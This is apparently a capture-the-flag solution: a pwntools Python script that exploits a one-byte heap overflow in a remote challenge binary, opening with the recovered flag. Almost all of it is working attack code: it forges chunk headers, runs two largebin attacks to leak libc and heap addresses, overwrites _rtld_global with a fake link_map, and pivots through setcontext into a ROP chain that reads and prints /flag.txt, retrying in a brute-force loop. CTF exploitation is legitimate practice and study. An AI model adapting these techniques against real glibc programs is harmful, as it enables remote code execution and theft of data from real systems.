#uscg{Even_1_Byte_Is_Still_Too_Much}
from pwn import *
import time
import warnings
warnings.filterwarnings("ignore")#get rid of warnings

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'debug'

while True:
    #p = remote('localhost', 31337)
    p = remote("0.cloud.chals.io", 20887)
    #p = process('./chal', env={"LD_PRELOAD":"./libc.so.6"})
    #gdb.attach(p, 'handle SIGALRM pass\nb _dl_fini\nb _dl_sort_maps\nb *setcontext + 127')
    try:
        def menu(idx):
            p.sendlineafter('>', str(idx))

        def create(idx, size, pay):
            menu(1)
            menu(idx)
            menu(size)
            p.sendafter('>', pay)

        def edit(idx, pay):
            menu(2)
            menu(idx)
            p.sendafter('>', pay)

        def doPrint(idx):
            menu(3)
            menu(idx)

        def free(idx):
            menu(4)
            menu(idx)

        #need to set up for largebin attack...
        create(0, 0x508, 'a' * 0x508)
        create(1, 0x460, 'OVL')# This size becomes larger later. 
        create(2, 0x480, 'A')
        create(3, 0x490, 'B')
        pay = b'\x00' * 0x430
        pay += p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)
        pay += b'\x00' * 0x70
        pay += p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)
        create(4, 0x580, pay)


        #Edit, overflowing size and rewriting with fake size; 0x1280 is good enough.
        edit(0, 'a' * 0x508 + '\x81\x12')

        free(1)


        #Chunk A
        pay = b'\x00' * 0x468
        pay += p64(0x461)
        pay += b'\x00' * 0x458
        pay += p64(0x21)
        pay += p64(0) * 3
        pay += p64(0x21)
        pay += p64(0)

        #Chunk B
        pay += p64(0x451)#smaller than above.
        pay += b'\x00' * 0x448
        pay += p64(0x21)
        pay += p64(0) * 3
        pay += p64(0x21)

        #Overwrite A and B, making sure C contains a libc leak.
        create(5,0xd90, pay)


        free(5)#Free 5.
        free(2)# Free A.


        #We want to partial overwrite the LSB of A->bk_nextsize.

        pay = b'\x00' * 0x468
        pay += p64(0x461)
        pay += p64(0)
        pay += p64(0)
        pay += p64(0)

        #manually input offset. it's 4th nibble of heap + 1.
        '''
        #for debugging local
        guess = int(input(), 16)
        guess = (guess << 4) + 0x5
        pay += b'\x36' + chr(guess).encode('latin')
        '''

        #guess for remote.
        pay += b'\x36\xc5'#want to end with 0xc536. 1/16 brute force here, guessing 4 bits.

        create(6, 0x700, pay)

        free(6)#Don't need this anymore.

        #setup largebin attack.
        free(3)#free B.

        #trigger first largbin attack.
        create(7, 0x710, 'largebin1')

        #now C has Libc + Heap leak. Print it.
        doPrint(4)

        leak = p.recvuntil('1.')[1:-2]
        libc = u64(leak[:6].ljust(8, b'\x00'))
        heap = u64(leak[6:].ljust(8, b'\x00'))

        print("LIBC LEAK: ", hex(libc))
        print("HEAP LEAK: ", hex(heap))

        libc_base = libc - 0x1edce0
        heap_base = heap - 0x10a0


        print("LIBC BASE: ", hex(libc_base))
        print("HEAP BASE: ", hex(heap_base))

        rtld_global = libc_base + 0x235040 + 0x5000#Offset different on remote
        l_next = libc_base + 0x236890 + 0x5000 

        print("_RTLD_GLOBAL: ", hex(rtld_global))

        #Don't need 7 anymore.
        free(7)

        '''
        Just in case, we will re-forge the 'normal' freelist with valid pointers throughout.
        This is defined as follows:
        A->fd = B
        A->bk = arena
        A->fd_nextsize = B
        A->bk_nextsize = B

        B->fd = arena
        B->bk = A
        B->fd_nextsize = nextsize
        B->bk_nextsize = nextsize
        '''

        A = heap_base + 0xc10
        B = heap_base + 0x10a0

        print("CHUNK A: ", hex(A))
        print("CHUNK B: ", hex(B))

        arena = libc_base + 0x1ee0e0
        nextsize = libc_base + 0x1edce0

        pay = b'\x00' * 0x468
        pay += p64(0x461)
        pay += p64(B)
        pay += p64(arena)
        pay += p64(B)
        pay += p64(rtld_global-0x20)#Set up second largebin attack
        pay += b'\x00' * 0x438
        pay += p64(0x21)
        pay += p64(0) * 3
        pay += p64(0x21)

        pay += p64(0)

        pay += p64(0x451)
        pay += p64(arena)
        pay += p64(A)
        pay += p64(nextsize)
        pay += p64(nextsize)
        pay += b'\x00' * 0x428
        pay += p64(0x21)
        pay += p64(0) * 3
        pay += p64(0x21)

        pay += b'\x00' * 0x20
        pay += p64(0)
        pay += p64(0x441)

        #write in above payload while overwriting C's size to 0x440. 
        create(8, 0xe00, pay)

        #final steps. free C now.
        free(4)

        #free 8.
        free(8)
        #Re-allocate our huge chunk, this time overwriting C with link_map stuff.

        setcontext = libc_base + 0x50055
        ret = setcontext - 53 +  127
        print("SETCONTEXT: ", hex(setcontext))


        pop_rdi = libc_base + 0x0004ac8f
        pop_rsi = libc_base + 0x00078a28
        pop_rdx = libc_base + 0x000f88fd
        pop_rax = libc_base + 0x000c61c7
        syscall = libc_base + 0x000867d2
        multipop = libc_base+0x000f0e18#pop r12, r13, r14 just in case


        #This is where our link_map is, i.e C.
        addr = heap_base + 0x1540

        #ROP chain here but could be anywhere else
        pay = b''
        pay += p64(2)

        pay += p64(multipop+6)#pop r14, clean up some junk
        pay += p64(syscall)
        pay += p64(syscall)

        #read
        pay += p64(pop_rax)
        pay += p64(0)
        pay += p64(pop_rdi)
        pay += p64(3)
        pay += p64(pop_rsi)
        pay += p64(A)#anywhere writeable is fine.
        pay += p64(pop_rdx)
        pay += p64(0x100)
        pay += p64(syscall)

        #write
        pay += p64(pop_rax)
        pay += p64(1)
        pay += p64(pop_rdi)
        pay += p64(1)
        pay += p64(pop_rsi)
        pay += p64(A)
        pay += p64(pop_rdx)
        pay += p64(0x100)
        pay += p64(syscall)

        pay += p64(pop_rax)
        pay += p64(60)
        pay += p64(syscall)

        pay = pay.ljust(0x468, b'\x00')

        pay += p64(0x461)
        pay += p64(B)
        pay += p64(arena)
        pay += p64(B)
        pay += p64(rtld_global-0x20)
        pay += b'\x00' * 0x438
        pay += p64(0x21)
        pay += p64(0) * 3
        pay += p64(0x21)

        pay += p64(0)

        pay += p64(0x451)
        pay += p64(arena)
        pay += p64(A)
        pay += p64(nextsize)
        pay += p64(nextsize)
        pay += b'\x00' * 0x428
        pay += p64(0x21)
        pay += p64(0) * 3
        pay += p64(0x21)

        pay += p64(0) * 4

        #linkmap; using actual l_next instead of forging objects since count differs w/ local vs remote
        #Kept forged l_next l_prev pointers because laziness, ignore them
        payload = b''
        payload += p64(0) * 3
        #payload += p64(addr+0x320)
        payload += p64(l_next)
        payload += p64(0)
        payload += p64(addr)
        payload += bytes(0x110-len(payload))
        payload += p64(addr+0x3b0)
        payload += p64(0)
        payload += p64(addr+0x3c0)
        payload += bytes(0x31c - len(payload))
        payload += p32(0x8)

        #These pointers be ignored, copy pasted from reference
        payload += p64(0)
        payload += p64(0)
        payload += p64(0)
        payload += p64(addr+0x350)
        payload += p64(0)
        payload += p64(addr+0x320)
        payload += p64(0)
        payload += p64(0)
        payload += p64(0)
        payload += p64(addr+0x380)
        payload += p64(0)
        payload += p64(addr+0x350)
        payload += p64(0) * 5
        payload += p64(addr+0x380)
        payload += p64(0)
        payload += p64(addr+0x3e0)

        #d_un.d_val = 0x10 / 8 = 2
        payload += p64(0)
        payload += p64(0x10)

        payload += p64(0)
        payload += p64(0)

        #Setcontext gadget here, 
        payload += p64(setcontext)
        payload += p64(ret) #Ret for pivot.

        #Set up values to load into registers with setcontext.
        payload += b'\x00' * 0x60
        payload += p64(addr + 0x498)#68, rdi = flag.txt below if you want to keep it there.
        payload += p64(0)#70, rsi 
        payload += p64(addr -0x1000)#78, rbp, somewhere printable just in case.
        payload += p64(0)#80, rbx 
        payload += p64(0)#88, rdx
        payload += p64(0)#90, N/A
        payload += p64(0)#98 rcx
        payload += p64(heap_base+0x7b0)#rsp pivot to above chunk.
        payload += p64(pop_rax)# 0xa8, rcx, setcontext does push rcx ret so must put gadget here.
        payload += b"/flag.txt\x00".ljust(0x10, b'\x00')

        pay += payload

        print("PAYLOAD LENGTH: ", hex(len(pay)))

        print("C: ", hex(addr))

        #context.log_level = 'debug'
        create(9, 0x1250, pay)

        #Wait for alarm to call exit() -> dl_fini -> profit
        p.interactive()
        p.close()
    except:
        p.close()
        time.sleep(0.5)









